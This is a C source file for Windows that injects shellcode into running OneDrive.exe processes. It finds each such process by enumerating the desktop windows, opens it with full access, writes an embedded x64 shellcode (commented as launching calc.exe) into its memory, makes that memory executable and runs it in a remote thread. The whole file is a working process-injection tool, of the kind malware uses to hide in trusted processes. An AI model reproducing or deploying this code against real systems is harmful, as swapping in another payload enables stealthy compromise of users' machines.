#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <string.h>
#include <psapi.h>

// Define the shellcode to launch calc.exe
const char shellcode[] = { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52
, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48
, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9
, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41
, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48
, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01
, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48
, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0
, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c
, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0
, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04
, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59
, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48
, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00
, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f
, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff
, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb
, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c
, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00 };

// Define the size of the shellcode
const size_t shellcode_size = sizeof(shellcode);

typedef struct Vec
{
    char **elements; // Change the type of the elements array to char *
    size_t size;
    size_t capacity;
} Vec;


// Constructor function for Vec objects
Vec Vec_new()
{
    Vec vec;
    vec.elements = malloc(16 * sizeof(char *)); // Change the type of the elements array to char *
    vec.size = 0;
    vec.capacity = 16;
    return vec;
}


// Function to check if a string is in a vector
int Vec_contains(Vec vec, char *str)
{
// Check if the vector contains the given string
for (size_t i = 0; i < vec.size; i++)
{
// Use strcmp to compare the elements in the vector to the given string
if (strcmp(vec.elements[i], str) == 0)
{
// Return true if the string is found
return 1;
}
}
// Return false if the string is not found
return 0;
}

void Vec_push(Vec *vec, char *element)
{
    // Check if the vector is full
    if (vec->size >= vec->capacity)
    {
        // Double the capacity of the vector
        vec->capacity *= 2;

        // Reallocate memory for the vector elements
        vec->elements = realloc(vec->elements, vec->capacity * sizeof(char *));
    }

    // Add the element to the end of the vector
    vec->elements[vec->size++] = element;
}

// Function to get the process ID of a window
DWORD get_process_id(HWND hwnd)
{
    // Declare the process_id variable
    DWORD process_id;

    // Get the process ID of the window
    GetWindowThreadProcessId(hwnd, &process_id);

    // Return the process ID
    return process_id;
}

// Function to get the process handle of a process ID
HANDLE get_process_handle(DWORD process_id)
{
    // Open a handle to the process with the given ID
    HANDLE process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_id);

    // Return the handle to the process
    return process_handle;
}

void inject_shellcode(HANDLE process_handle, const char *shellcode, size_t shellcode_size)
{
    // Declare the variables for the remote memory address and thread handle
    LPVOID remote_memory_address;
    HANDLE thread_handle;

    // Allocate memory in the remote process with write-only permissions
    remote_memory_address = VirtualAllocEx(process_handle, NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Write the shellcode to the memory
    WriteProcessMemory(process_handle, remote_memory_address, shellcode, shellcode_size, NULL);

    // Set the memory back to execute permissions
    DWORD old_protect;
    VirtualProtectEx(process_handle, remote_memory_address, shellcode_size, PAGE_EXECUTE, &old_protect);

    // Create a thread in the remote process to execute the shellcode
    thread_handle = CreateRemoteThread(process_handle, NULL, 0, (LPTHREAD_START_ROUTINE)remote_memory_address, NULL, 0, NULL);

    if (thread_handle == NULL)
    {
        // Print an error message if the thread could not be created
        printf("Error: Failed to create remote thread\n");
    }

    // Wait for the remote thread to finish executing
    WaitForSingleObject(thread_handle, INFINITE);

    // Clean up the allocated memory and thread handle in the remote process
    VirtualFreeEx(process_handle, remote_memory_address, 0, MEM_RELEASE);
    CloseHandle(thread_handle);
}


BOOL CALLBACK callback(HWND hwnd, LPARAM lParam)
{
// Get the process ID of the window
    DWORD process_id = get_process_id(hwnd);

    // Get the process handle of the process ID
    HANDLE process_handle = get_process_handle(process_id);

    // Declare the process_name variable
    char process_name[MAX_PATH];

    // Get the process name of the process ID
    if (GetProcessImageFileNameA(process_handle, process_name, sizeof(process_name)) != 0)
    {
        // Create a copy of the process name
        char *process_name_copy = strdup(process_name);

        //strip the process name to just the executable name
        char *process_name_stripped = strrchr(process_name_copy, '\\') + 1;
         //if the executable name is equal to <target>.exe then inject the shellcode
        
        if (strcmp(process_name_stripped, "OneDrive.exe") == 0)
        {
            //print the process name
            printf("Found process: %s\n", process_name_stripped);
            //print the pid of the process
            printf("PID: %d\n", process_id);
            //print the process handle
            printf("Process Handle: %p\n", process_handle);
            // Inject the shellcode into the process
            inject_shellcode(process_handle, shellcode, shellcode_size);
        }

        // Add the process name to the vector
        Vec_push((Vec*)lParam, process_name_copy);
    }

    // Return true to continue the enumeration
    return TRUE;
}



int main()
{
    // Declare a vector to store the process names
    Vec process_names = Vec_new();

    // Define a buffer for the error message
    char error_message[256];

    // Enumerate all of the windows on the desktop
    if (!EnumWindows((WNDENUMPROC)callback, (LPARAM)&process_names))
    {
            // Print an error message if the call fails
    FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM, NULL, GetLastError(), 0, error_message, sizeof(error_message), NULL);
    printf("Error: EnumWindows failed with error code %d: %s\n", GetLastError(), error_message);
    return 1;
    };
 
    // Print the process names
    /*
    printf("Unique process names:\n");
    for (size_t i = 0; i < process_names.size; i++)
    {
        //check if the process name is unique
        if (Vec_contains(process_names, process_names.elements[i]))
        {
            printf("- %s\n", process_names.elements[i]);
        }
        else
        {
            //if the process name is not unique then do nothing and continue
            continue;
        }                                               
        // printf("- %s\n", process_names.elements[i]);
    }
    */

    // Free the memory allocated for the vector elements
    for (size_t i = 0; i < process_names.size; i++)
    {
        free(process_names.elements[i]);
    }
    free(process_names.elements);

    return 0;
}
